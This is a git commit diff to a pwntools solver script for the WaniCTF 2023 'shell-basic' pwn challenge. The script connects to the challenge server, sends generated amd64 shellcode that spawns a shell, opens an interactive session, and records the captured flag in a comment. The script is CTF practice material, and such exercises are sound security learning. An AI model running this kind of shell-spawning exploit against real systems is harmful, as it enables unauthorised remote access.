69caf1dc330c13499bda6b160c3e531309df0966
mizuirorivi <onodaha@gmail.com>
2023-05-05 01:09:28 +0900

    pushd

--- 2023/wanictf/pwn/pwn-shell-basic/solver_template.py
+++ 2023/wanictf/pwn/pwn-shell-basic/solver_template.py
@@ -1,10 +1,15 @@
 from pwn import *
 
-# pc = process("./chall")
 host = "shell-basic-pwn.wanictf.org"
 port = 9004
+context(arch='amd64',os='linux')
 
+# pc = proes(")
 pc = remote(host,port)
+# pc.recvuntil(b'hellcode: ')
 shellcode = asm(shellcraft.amd64.sh())
-print(shellcode)
+pc.sendline(shellcode)
 pc.interactive()
+                      
+#FLAG{NXbit_Blocks_shellcode_next_step_is_ROP}
+
